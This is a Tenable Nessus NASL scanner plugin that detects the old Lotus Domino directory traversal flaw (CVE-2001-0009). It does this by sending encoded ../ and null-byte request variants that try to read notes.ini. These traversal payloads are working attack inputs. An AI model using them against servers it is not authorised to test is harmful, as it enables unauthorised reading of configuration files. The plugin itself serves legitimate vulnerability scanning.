#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(11344);
  script_version("1.25");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/05/28");

  script_cve_id("CVE-2001-0009");
  script_bugtraq_id(2173);

  script_name(english:"IBM Lotus Domino Directory Traversal Arbitrary File Access");

  script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote host.");
  script_set_attribute(attribute:"description", value:
"It is possible to read arbitrary files on the remote server by 
prepending %00%00.nsf/../ in front of it.");
  script_set_attribute(attribute:"solution", value:
"Upgrade to a newer version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2001/01/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/03/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:lotus_domino");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_set_attribute(attribute:"enable_cgi_scanning", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2003-2024 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

banner = get_http_banner(port:port);
if ( ! banner ) exit(0);
if ( "Lotus Domino" >!< banner ) exit(0);


banner = get_http_banner(port:port);
if(egrep(pattern:"Lotus-Domino/5\.0\.[0-6][^0-9]", string:banner))
{
	security_warning(port);
	exit (0);
}


# Test for the flaw anyway

exts = make_list(".nsf", ".box", ".nt4");
vars = make_list("%00", "%00%00", "%20", "%C0%AF", "%c0%af%00", "%20%00", "/..");
ups  = make_list("/../../../../../", 
		"//../../../../../");



foreach ext (exts)
 foreach tvar (vars)
  foreach up (ups)
{
  url = string(tvar, ext, up, "lotus/domino/notes.ini");
  w = http_send_recv3(port:port, method: "GET", item:url);
  if (isnull(w)) exit(0);
  r = tolower(w[2]);
  if(("httphost" >< r) 		 || ("resultsdirectory" >< r)  ||
     ("numaddlocalreplica" >< r) || ("normalmessagesize" >< r) ||
     ("sharednotes" >< r)	 || ("[notes]" >< r)	       ||
     ("notesprogram" >< r)){
     	security_warning(port);
	exit(0);
	}
}
